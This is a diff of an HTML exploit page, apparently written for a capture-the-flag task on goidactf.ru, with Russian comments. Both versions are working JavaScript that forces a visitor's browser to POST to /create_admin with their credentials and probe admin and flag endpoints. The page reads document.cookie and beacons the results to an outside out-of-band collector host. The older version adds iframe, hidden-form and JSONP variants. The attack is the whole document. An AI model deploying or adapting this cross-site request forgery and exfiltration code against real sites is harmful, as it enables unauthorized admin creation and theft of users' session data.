@@ -2,189 +2,86 @@
 <html>
 <body>
 <script>
-const WH = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
+const COLLAB = 'https://zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun';
 const TARGET = 'https://tasks.goidactf.ru:20395';
-const REQ_ID = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
+const REQ_ID = 'exp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
 
-// Функция отправки в query параметре
+// Функция для отправки данных
 function send(label, data) {
     const encoded = btoa(JSON.stringify(data));
-    new Image().src = `${WH}/?${label}=${encodeURIComponent(encoded)}`;
+    new Image().src = `${COLLAB}/?${label}=${encodeURIComponent(encoded)}`;
 }
 
-// === 1. srcdoc iframe подход ===
-const srcdocFrame = document.createElement('iframe');
-srcdocFrame.name = 'srcdocFrame';
-srcdocFrame.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';
-srcdocFrame.srcdoc = `
-<!DOCTYPE html>
-<html>
-<head>
-    <base href="${TARGET}/">
-</head>
-<body>
-    <script>
-        fetch('/create_admin', {
-            method: 'POST',
-            headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-            body: 'new_admin_login=srcdoc_${REQ_ID}'
-        })
-        .then(r => r.text().then(t => ({
-            status: r.status,
-            statusText: r.statusText,
-            body: t.substring(0, 300)
-        })))
-        .then(data => {
-            window.parent.postMessage({
-                type: 'srcdoc_response',
-                data: data
-            }, '*');
-        })
-        .catch(e => {
-            window.parent.postMessage({
-                type: 'srcdoc_error', 
-                data: e.toString()
-            }, '*');
-        });
-    <\/script>
-</body>
-</html>`;
+send('start', {id: REQ_ID, target: TARGET});
 
-// === 2. data: URI iframe подход ===  
-const dataUriFrame = document.createElement('iframe');
-dataUriFrame.name = 'dataUriFrame';
-dataUriFrame.style.cssText = 'width:0;height:0;border:0;position:absolute;left:0;top:0;';
-dataUriFrame.src = 'data:text/html;charset=utf-8,' + encodeURIComponent(`
-<!DOCTYPE html>
-<html>
-<script>
-    var xhr = new XMLHttpRequest();
-    xhr.open('POST', '${TARGET}/create_admin', true);
-    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
+// 1. Пытаемся создать админа
+fetch(`${TARGET}/create_admin`, {
+    method: 'POST',
+    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
+    credentials: 'include',
+    body: `new_admin_login=HACKED_${REQ_ID}`
+})
+.then(r => Promise.all([r.status, r.statusText, r.text()]))
+.then(([status, statusText, body]) => {
+    send('create_result', {
+        status,
+        statusText,
+        body: body.substring(0, 1000), // Первые 1000 символов
+        length: body.length
+    });
     
-    xhr.onreadystatechange = function() {
-        if (xhr.readyState === 4) {
-            // Сохраняем в window.name для чтения родителем
-            window.name = JSON.stringify({
-                type: 'datauri_response',
-                status: xhr.status,
-                response: xhr.responseText.substring(0, 200)
-            });
-            
-            // Также postMessage
-            if (window.parent) {
-                window.parent.postMessage({
-                    type: 'datauri_response',
-                    status: xhr.status,
-                    response: xhr.responseText.substring(0, 200)
-                }, '*');
-            }
-        }
-    };
-    
-    xhr.onerror = function() {
-        window.name = 'error:' + xhr.status;
-    };
-    
-    xhr.send('new_admin_login=datauri_${REQ_ID}');
-<\/script>
-</html>`);
-
-// === 3. Обычная форма + сетевой мониторинг ===
-const normalForm = document.createElement('form');
-normalForm.method = 'POST';
-normalForm.action = TARGET + '/create_admin';
-normalForm.target = '_blank'; // откроет в новой вкладке
-normalForm.style.display = 'none';
-normalForm.innerHTML = `
-    <input type="hidden" name="new_admin_login" value="normal_${REQ_ID}">
-    <input type="hidden" name="callback" value="${WH}/callback?id=${REQ_ID}">
-    <input type="hidden" name="redirect" value="${WH}/redirect?id=${REQ_ID}">
-`;
-
-// === 4. Дополнительные GET запросы для поиска флага ===
-const flagEndpoints = [
-    '/admin', '/flag', '/getflag', '/api/flag', 
-    '/dashboard', '/panel', '/root', '/superadmin',
-    '/api/admin', '/internal/flag'
-];
-
-// === ОБРАБОТЧИКИ СООБЩЕНИЙ ===
-window.addEventListener('message', (event) => {
-    if (event.data && event.data.type) {
-        send(event.data.type, event.data);
+    // 2. Если успешно, пробуем получить админскую страницу
+    if (status === 200 || status === 201) {
+        return fetch(`${TARGET}/admin`, {credentials: 'include'});
     }
-});
-
-// === ЗАПУСК ВСЕГО ===
-document.body.appendChild(srcdocFrame);
-document.body.appendChild(dataUriFrame);  
-document.body.appendChild(normalForm);
-
-// Старт
-send('start', {
-    reqId: REQ_ID,
-    target: TARGET,
-    time: new Date().toISOString()
-});
-
-// 1. Запускаем srcdoc iframe (мгновенно)
-send('srcdoc_start', {frame: 'srcdoc_loaded'});
-
-// 2. Запускаем data: URI iframe
-setTimeout(() => {
-    send('datauri_start', {frame: 'datauri_loaded'});
+    return Promise.reject(`Status ${status}: ${statusText}`);
+})
+.then(r => r.text())
+.then(adminPage => {
+    send('admin_page', {
+        length: adminPage.length,
+        snippet: adminPage.substring(0, 500)
+    });
     
-    // Пытаемся прочитать window.name через 2 секунды
-    setTimeout(() => {
-        try {
-            const result = dataUriFrame.contentWindow.name;
-            if (result) {
-                send('datauri_name', {name: result});
-            }
-        } catch(e) {
-            send('datauri_name_error', {error: e.toString().substring(0, 50)});
-        }
-    }, 2000);
-}, 500);
+    // 3. Ищем флаги в странице
+    const flagRegex = /goidactf{[^}]*}|ctf{[^}]*}|flag{[^}]*}/gi;
+    const flags = adminPage.match(flagRegex);
+    if (flags) {
+        send('flags', {flags});
+    }
+    
+    // 4. Пробуем другие endpoints
+    const endpoints = [
+        '/flag', '/getflag', '/api/flag', 
+        '/dashboard', '/internal', '/root',
+        '/api/admin', '/superadmin', '/config'
+    ];
+    
+    endpoints.forEach((endpoint, i) => {
+        setTimeout(() => {
+            fetch(`${TARGET}${endpoint}`, {credentials: 'include'})
+            .then(r => r.text().then(t => ({
+                endpoint,
+                status: r.status,
+                body: t.substring(0, 300)
+            })))
+            .then(data => send(`ep_${i}`, data))
+            .catch(() => {});
+        }, i * 500);
+    });
+})
+.catch(error => {
+    send('error', {error: error.toString()});
+});
 
-// 3. Отправляем обычную форму через 1 секунду
+// 5. Дополнительно: проверяем куки
 setTimeout(() => {
-    normalForm.submit();
-    send('normal_form', {submitted: true});
+    send('cookies', {cookies: document.cookie});
 }, 1000);
 
-// 4. Пробуем GET запросы через 2 секунды
+// 6. Финальный пинг
 setTimeout(() => {
-    flagEndpoints.forEach((endpoint, i) => {
-        setTimeout(() => {
-            const img = new Image();
-            img.src = `${TARGET}${endpoint}?_=${REQ_ID}_${i}`;
-            send('get_attempt', {endpoint: endpoint, index: i});
-        }, i * 600);
-    });
-}, 2000);
-
-// 5. Пробуем JSONP через 4 секунды
-setTimeout(() => {
-    const script = document.createElement('script');
-    script.src = `${TARGET}/create_admin?callback=jsonpCallback_${REQ_ID}&login=jsonp_${REQ_ID}`;
-    document.body.appendChild(script);
-    
-    window[`jsonpCallback_${REQ_ID}`] = function(data) {
-        send('jsonp_response', data);
-    };
-    
-    send('jsonp_attempt', {attempted: true});
-}, 4000);
-
-// 6. Финальная проверка через 5 секунд
-setTimeout(() => {
-    send('final', {
-        all_methods_tried: true,
-        reqId: REQ_ID,
-        timestamp: new Date().toISOString()
-    });
+    send('done', {id: REQ_ID, time: new Date().toISOString()});
 }, 5000);
 </script>
 </body>
